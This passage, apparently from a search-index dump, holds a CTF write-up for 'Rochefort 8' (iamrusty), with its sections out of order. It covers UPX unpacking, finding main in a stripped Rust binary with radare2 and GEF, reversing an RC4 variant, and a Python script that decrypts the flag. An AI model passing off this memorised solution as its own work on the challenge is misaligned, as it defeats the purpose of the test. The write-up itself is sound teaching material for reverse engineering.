#9 0x00007ffff7bbbb17 in __libc_start_main (main=0x55555556d7a0, argc=0x1, argv=0x7fffffffde68, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde58) at ../csu/libc-start.c:310 #10 0x000055555555ac2a in ?? () No shortcuts here. We can start by looking at the function called after __libc_start_main , which is at #8. Because the addresses here are added with a base address, we can use vmmap to get the base address, which is 0x0000555555554000 . Subtracting it from the address at #8, we can inspect it in r2, at address 0x19db3 . We see that before this instruction, call fcn.000079b0 was being executed, so #7 is an address inside fcn.000079b0 . Let's try to set a breakpoint at 0x19dae and see if we can find the jmp [rsi+0x18] instruction from here. Since the binary is a PIE, we can't set the breakpoint at 0x19dae using break *0x19dae , since during execution there will be a base address added to it as seen earlier, and 0x19dae will become an invalid address. To do this, we can use pie break *0x19dae from gef, and pie run to run it with these settings. Great! jmp [rsi+0x18] is close to us. Single stepping a few steps, we arrive at call [rdi] , which brings us into the actual program main , which is at 0x55555556dff0 , without the base address it is 0x19ff0 . Define function in r2 Now we are left with defining 0x19ff0 as a function in r2, and renaming it to actual_main . We can do this by seeking 0x19ff0 using s 0x19ff0 , then entering visual mode using V , and pressing df to define function, lastly dr to rename function. Once we are done with this, we can open up the graph view and actually start to reverse what the binary is doing. rust-main-break Since I do not want to do this kind of searching all the time, I wrote a command for gef-extras that automates this process. It will look like something like the following gef\u27a4 rust-main-break [+] Breaking at '{<text variable, no debug info>} 0x5570 <__libc_start_main@plt>' [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". [+] Searching for 'jmp QWORD PTR [rsi + 0x18]' instructions [+] Trying 0x55555555b9b5 [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". 0x000055555556eb40 in ?? () 0x000055555556eb41 in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500 $rax : 0x0 $rbx : 0x5555557bb2c8 \u2192 0x0000000000000000 $rcx : 0x0 $rdx : 0x5555557bb2c8 \u2192 0x0000000000000000 $rsp : 0x7fffffffdc28 \u2192 0x000055555556eb43 \u2192 xor eax, eax $rbp : 0x7ffff7625000 \u2192 0x0000000000000001 $rsi : 0x5555557baae8 \u2192 0x000055555556eb30 \u2192 ret $rdi : 0x7fffffffdcb8 \u2192 0x000055555556dff0 \u2192 push r14 $rip : 0x55555556dff0 \u2192 push r14 $r8 : 0x0 $r9 : 0x800000000 $r10 : 0xf $r11 : 0x7ffff7fe7990 \u2192 <_dl_find_dso_for_object+0> push r13 $r12 : 0x7fffff7fe000 $r13 : 0x1 $r14 : 0x7fffffffdc40 \u2192 0x0000000000000001 $r15 : 0x7fffff7ff000 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $fs: 0x0000 $gs: 0x0000 $es: 0x0000 $ds: 0x0000 $cs: 0x0033 $ss: 0x002b \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdc28\u2502+0x00: 0x000055555556eb43 \u2192 xor eax, eax \u2190 $rsp 0x00007fffffffdc30\u2502+0x08: 0x0000000000000000 0x00007fffffffdc38\u2502+0x10: 0x000055555556ddb3 \u2192 mov ebx, eax 0x00007fffffffdc40\u2502+0x18: 0x0000000000000001 \u2190 $r14 0x00007fffffffdc48\u2502+0x20: 0x00007fffff7fe000 0x00007fffffffdc50\u2502+0x28: 0x00007fffff7ff000 0x00007fffffffdc58\u2502+0x30: 0x00007ffff7625000 \u2192 0x0000000000000001 0x00007fffffffdc60\u2502+0x38: 0x00007fffffffde78 \u2192 0x00007fffffffe205 \u2192 \"XDG_RUNTIME_DIR=/run/user/1000\" \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x55555556dfe0 ud2 0x55555556dfe2 nop WORD PTR cs:[rax+rax*1+0x0] 0x55555556dfec nop DWORD PTR [rax+0x0] \u2192 0x55555556dff0 push r14 0x55555556dff2 push rbx 0x55555556dff3 sub rsp, 0x298 0x55555556dffa lea rdi, [rsp+0x180] 0x55555556e002 xor ebx, ebx 0x55555556e004 xor esi, esi \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ threads ]\u2500\u2500\u2500\u2500 [#0] Id 1, Name: \"unpacked\", stopped, reason: SINGLE STEP \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0x55555556dff0 \u2192 push r14 [#1] 0x55555556eb43 \u2192 xor eax, eax [#2] 0x55555556ddb3 \u2192 mov ebx, eax [#3] 0x7ffff7bbbb17 \u2192 Name: __libc_start_main(main=0x55555556d7a0, argc=0x1, argv=0x7fffffffde68, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde58) [#4] 0x55555555ac2a \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 0x000055555556dff0 in ?? () [+] Found 'main' at 0x55555556dff0 Reverse encryption Now that we can analyse main , the next step is to reverse the encryption algorithm. At the start of the function, we see a few blocks of data are being copied to the stack. Inspecting those values, :> ps @ 0x545b0 \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09 \\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff it looks like the initial permutation of RC4 . It's something important to keep in mind, but not to quickly jump to conclusions yet. (Actually, a hint was given that the encryption method is a variation of RC4) Output tracing At this point, what I decided to do, was to try to trace the output of the program, to see what is being done to it, and where did it come from. Again, I made use of the backtrace. (For reference) gef\u27a4 bt #0 0x00007ffff7f7f291 in __libc_write (fd=0x1, buf=0x7ffff761c000, nbytes=0x57) at ../sysdeps/unix/sysv/linux/write.c:27 #1 0x0000555555560e9c in ?? () #2 0x0000555555562278 in ?? () #3 0x0000555555561568 in ?? () #4 0x000055555556a0f6 in ?? () #5 0x00005555555625db in ?? () #6 0x000055555556e696 in ?? () #7 0x000055555556eb43 in ?? () #8 0x000055555556ddb3 in ?? () #9 0x00007ffff7bbbb17 in __libc_start_main (main=0x55555556d7a0, argc=0x1, argv=0x7fffffffde68, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde58) at ../csu/libc-start.c:310 #10 0x000055555555ac2a in ?? () This time, we want to find the address of the instruction in actual_main that calls a function that leads to printing the encrypted flag. After some checking, #6 is the one we are looking for. In particular, call fcn.0000e520 at 0x1a691 . Now, the question is, is fcn.0000e520 a printing function, or a function that further encrypts the flag then calls a printing function? To do this, we can inspect the registers and stack to see if we can find traces of the final encrypted flag. Let's set a breakpoint at 0x1a691 to inspect the stack before fcn.0000e520 is called. Looking at the registers, we see some optimistic results. In particular, rdx contains an address that leads to the string \"The encrypted flag is\" . $rax : 0x7fffffffdad8 \u2192 0x00007fffffffdae8 \u2192 0x00007ffff762a000 \u2192 0x86b1fb0b226031d5 $rbx : 0x7ffff7625050 \u2192 0x0000000000000002 $rcx : 0x0 $rdx : 0x7fffffffdb00 \u2192 0x00005555557baac8 \u2192 0x00005555555aa900 \u2192 \"The encrypted flag is \\n/proc/curproc/file\" $rsp : 0x7fffffffd980 \u2192 \"6999 557bc000 rw-p 00\" $rbp : 0x7ffff7625000 \u2192 0x0000000000000001 $rsi : 0x7fffffffd9b0 \u2192 0x00007ffff7625050 \u2192 0x0000000000000002 $rdi : 0x7fffffffd990 \u2192 \"557bc000 rw-p 00\" $rip : 0x55555556e691 \u2192 call 0x555555562520 $r8 : 0x0 $r9 : 0x61 $r10 : 0x310 $r11 : 0xcc $r12 : 0x7fffff7fe000 $r13 : 0x1 $r14 : 0x7fffffffdc40 \u2192 0x0000000000000001 $r15 : 0x7fffff7ff000 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $fs: 0x0000 $gs: 0x0000 $es: 0x0000 $ds: 0x0000 $cs: 0x0033 $ss: 0x002b It seems like the address contained in rdx may contain our encrypted flag. Using telescope from gef, we can easily inspect the contents in the address contained by rdx . gef\u27a4 telescope $rdx 0x00007fffffffdb00\u2502+0x00: 0x00005555557baac8 \u2192 0x00005555555aa900 \u2192 \"The encrypted flag is \\n/proc/curproc/file\" \u2190 $rdx 0x00007fffffffdb08\u2502+0x08: 0x0000000000000002 0x00007fffffffdb10\u2502+0x10: 0x00005555555aa8c0 \u2192 add DWORD PTR [rax], eax 0x00007fffffffdb18\u2502+0x18: 0x0000000000000001 0x00007fffffffdb20\u2502+0x20: 0x00007fffffffdad8 \u2192 0x00007fffffffdae8 \u2192 0x00007ffff762a000 \u2192 0x86b1fb0b226031d5 0x00007fffffffdb28\u2502+0x28: 0x0000000000000001 0x00007fffffffdb30\u2502+0x30: 0x8754a2a1c8a40fb0 0x00007fffffffdb38\u2502+0x38: 0x573deb40f0ec6a78 0x00007fffffffdb40\u2502+0x40: 0x05bb44d0048dce4d 0x00007fffffffdb48\u2502+0x48: 0xc9343efffc4b7fed We see some numbers at $rdx + 0x30 . Let's check the decimal values of some bytes in there. gef\u27a4 x/10db $rdx+0x30 0x7fffffffdb30: -80 15 -92 -56 -95 -94 84 -121 0x7fffffffdb38: 120 106 gef\u27a4 x/10ub $rdx+0x30 0x7fffffffdb30: 176 15 164 200 161 162 84 135 0x7fffffffdb38: 120 106 Our program output is $ ./unpacked The encrypted flag is [213, 49, 96, 34, 11, 251, 177, 134, 203, 44, 118, 96, 155, 172] Sadly, those numbers do not match our program output. However, making some observations, we see that there is another set of possible numbers contained in the address at $rdx + 0x20 . gef\u27a4 x/10ub 0x00007ffff762a000 0x7ffff762a000: 213 49 96 34 11 251 177 134 0x7ffff762a008: 203 44 It matches! Our encrypted flag is contained in 0x00007ffff762a000 ! Identify relevant code blocks We are very close! Now, we can follow on by checking which part of the code affects this block of memory , then from there reverse the encryption algorithm. Typically in Rust binaries, there are a lot of functions that call pthread functions within them. Normally, we can ignore these functions as they are just used by Rust for things like safety checking or error handling. There are several ways we can identify the code blocks that are relevant. We can instrument the binary to stop when the contents in that memory block matches the encrypted flag. This can be done using tools like angr or GDB scripting. I chose to just manually set some breakpoints and check by hand. Doing so, I managed to identify that the blocks that matter in the CFG are If we look at the Wikipedia entry of RC4, the first block prepares the initial permutation. The second block is the KSA (Key scheduling algorithm). The third block performs some form of malloc-like operation that returns the address of the block containing our encrypted flag. The final block is the PRGA (pseudo-random generation algorithm) part. Looking at the PRGA block, we see occurences of xor instructions. This should be the flag, being encrypted by the output of the PRGA. If we piece them together, we get the string WhatIsTheFlag? . Conclusion We are done with reversing. This binary shows us the encryption method used to encrypt the string WhatIsTheFlag? . Now we need to decrypt the actual flag given [193, 43, 110, 37, 49, 203, 177, 168, 213, 56, 111, 114, 136, 234, 91, 129, 74, 3, 134, 159, 134, 47, 53, 245, 103, 247, 251, 52, 198, 245, 208, 139, 188, 151, 208, 36, 109, 245, 48, 174, 123, 154] To sum up, the encryption algorithm is based on RC4, Sets up an initial permutation Swaps values in the initial permutation around for 256 iterations (Key scheduling) For each character in the flag, obtain a corresponding key byte after swapping some values in the permutation again (Pseudo-random generation), then xors it with the flag to produce the ciphertext Solution Now, we are left with writing a script to generate the keystream based on the one given in the binary, in order to decrypt the actual flag. Since the key scheduling part (block 2) is just setting up the permutation for the random number generation, we can let the program execute until that is done, then dump the memory containing the permutation to a file. Looking at the disassembly, we see that the key schedule is being stored in rsp + 0x182 . So, we can just set a breakpoint at the start of block 3 (i.e. when block 2 finishes), and then dump the contents in that memory block to a file. gef\u27a4 pie break *0x1a187 gef\u27a4 pie run gef\u27a4 dump memory key_schedule $rsp+0x182 $rsp+0x182+256 Then, we got to write a function to emulate the PRGA part. This part is just purely reversing the disassembly, nothing special. key_index = 0 key_index2 = 0 key_schedule = map(ord, list(open('key_schedule', 'r').read())) def get_key(): global key_index, key_index2, key_schedule key_index = (key_index + 1) % 256 key_index2 = (key_index2 + key_schedule[key_index]) % 256 key_schedule[key_index2], key_schedule[key_index] = key_schedule[key_index], key_schedule[key_index2] return key_schedule[(key_schedule[key_index] + key_schedule[key_index2]) % 256] And lastly, print the flag. if __name__ == '__main__': c = [193, 43, 110, 37, 49, 203, 177, 168, 213, 56, 111, 114, 136, 234, 91, 129, 74, 3, 134, 159, 134, 47, 53, 245, 103, 247, 251, 52, 198, 245, 208, 139, 188, 151, 208, 36, 109, 245, 48, 174, 123, 154] flag = '' for i in xrange(len(c)): flag += chr(c[i] ^ get_key()) print flag","title":"iamrusty"},{"location":"crossctf-finals2018/re/iamrusty/#crossctf-finals-2018-rochefort-8-re","text":"Decrypt the encrypted flag! Creator - quanyang (@quanyang) iamrusty The encrypted flag is [193, 43, 110, 37, 49, 203, 177, 168, 213, 56, 111, 114, 136, 234, 91, 129, 74, 3, 134, 159, 134, 47, 53, 245, 103, 247, 251, 52, 198, 245, 208, 139, 188, 151, 208, 36, 109, 245, 48, 174, 123, 154]","title":"CrossCTF Finals 2018 : Rochefort 8 (re)"},{"location":"crossctf-finals2018/re/iamrusty/#summary","text":"We are given a stripped binary, which name suggests to be a Rust binary. Reversing it, we see that it performs some form of variation of RC4, and we will use it to decrypt our flag. The steps taken to reverse this binary are: Apply zignatures Find main Reverse encryption algorithm Decrypt the flag","title":"Summary"},{"location":"crossctf-finals2018/re/iamrusty/#analysis","text":"For this challenge, I used r2 as I am more familiar with it compared to IDA. Like usual, start by running file on the binary and executing it to see what it is about. $ file iamrusty iamrusty: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), statically linked, stripped $ ./iamrusty [1] 28689 segmentation fault ./iamrusty We see that it is a statically linked, stripped binary. Weirdly, it crashes. Anyways, load the binary in analysis mode in r2. $ r2 -A iamrusty Then, use afl to check the functions. [0x0012be40]> afl 0x0012be40 3 50 entry0 0x0012be72 7 62 fcn.0012be72 0x0012beb0 20 164 fcn.0012beb0 0x0012c01c 9 17 -> 124 fcn.0012c01c 0x0012c02d 15 107 -> 228 fcn.0012c02d 0x0012c098 1 34 fcn.0012c098 We see only 6 functions. There are a few possible reasons to this: The binary is statically linked and uses very minimal amount of library functions The binary is written by hand The binary is packed Looking into entry0 , we see We see some initialization and call fcn.0012beb0 . Peeking into it in graph view, we see a rather complicated graph, and non-typical instructions like call r11 . This eliminates the possiblity that it is hand-written assembly. It is also unlikely to be the first case, as normally there would be a __libc_start_main function call at the start. Hence, we should explore the possibility that it is packed. Using strings on the binary, we see UPX! on the first line. Ah, it is a UPX packed binary. We can unpack it to analyse it. $ upx -d iamrusty -o unpacked Now, running file again and executing the binary. $ file unpacked unpacked: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=6d25298b54bfbbf751f73e6e0833e24961702770, stripped $ ./unpacked The encrypted flag is [213, 49, 96, 34, 11, 251, 177, 134, 203, 44, 118, 96, 155, 172] Now this makes more sense. Let's also run strings on it. Doing so, we see strings like \"jemalloc\" or strings contaning \"rs\". So, we can confirm that this is a Rust binary.","title":"Analysis"},{"location":"crossctf-finals2018/re/iamrusty/#apply-zigs","text":"Before starting to analyse the binary, since it is stripped, this means it will be very difficult to know what each function does. I made use of zignatures to try to identify each function. The radare2 book has a more detailed documentation of the zignatures namespace. I prepared a zignature file which contains the signatures of most commonly used Rust standard library functions. To do this, don't load the binary in analysis mode, just plain r2 ./unpacked . Then, load the zignature file, apply it to our binary, and only after that use aaa to analyse it. [0x00006c01]> zo /home/daniel/REsources/zigs/rust/rust.z [0x00006c01]> z/ [+] searching 0x00000000 - 0x00063794 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x0000cb20 Sequencial hit ignored. 0x0000cb60 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00014240 Sequencial hit ignored. 0x00015b00 Sequencial hit ignored. 0x00015b00 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. 0x00017780 Sequencial hit ignored. [+] searching 0x00263900 - 0x002683b8 [+] searching function metrics hits: 206 [0x00006c01]> aaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze len bytes of instructions for references (aar) [ WARNING : block size exceeding max block size at 0x0000d7a0 [+] Try changing it with e anal.bb.maxsize [x] Analyze function calls (aac) [x] Use -AA or aaaa to perform additional experimental analysis. [x] Constructing a function name for fcn.* and sym.func.* functions (aan) It is not perfect. It will not successfully label every single function in there, but it was really helpful in identifying functions like sign.bytes.sym.core::fmt::Write::write_fmt::hda0de9044a822dbe_2 sign.bytes.sym.core::fmt::Formatter::pad_integral::__u7b__u7b_closure_u7d__u7d_::h405811ed46957e23_0 which helped a lot in guessing what a function does.","title":"Apply zigs"},{"location":"crossctf-finals2018/re/iamrusty/#find-main","text":"One major problem with this being a stripped binary means we don't know where main is, and it is not as obvious as typical C binaries. Typically, for C binaries, the program will enter main after the call of __libc_start_main . However, for Rust, after __libc_start_main , the program does a lot of setting up, before going into the actual main . And since it is a stripped binary, we won't know which function call is main or for setting up!","title":"Find main"},{"location":"crossctf-finals2018/re/iamrusty/#useful-pattern","text":"However, I am not completely stuck. From trying to reverse different simple Rust binaries I compiled myself, I noticed a very helpful pattern. It turns out that regardless of whatever or however much set up is being done at the start, before executing the actual main , Rust will execute the following instruction block. jmp QWORD PTR [rsi + 0x18] ... # a few instructions call QWORD [rdi] There will always be a jmp to [rsi + 0x18] , and after a few instructions that may differ depending on the binary, it will call QWORD [rdi] , bringing us into the real main .","title":"Useful pattern"},{"location":"crossctf-finals2018/re/iamrusty/#using-backtrace","text":"Now that we have an idea of what to look for, we can further narrow down our search space by making use of the backtrace at the point where the program prints the encrypted flag. This is because the printing must be called inside main , so the address of an instruction that calls main will be inside the backtrace for sure. For this part, I used GEF. To add a breakpoint when the encrypted is being printed, we can set a catchpoint at a write syscall. gef\u27a4 catch syscall write Then use r to start executing the binary, and bt to view the backtrace. gef\u27a4 bt #0 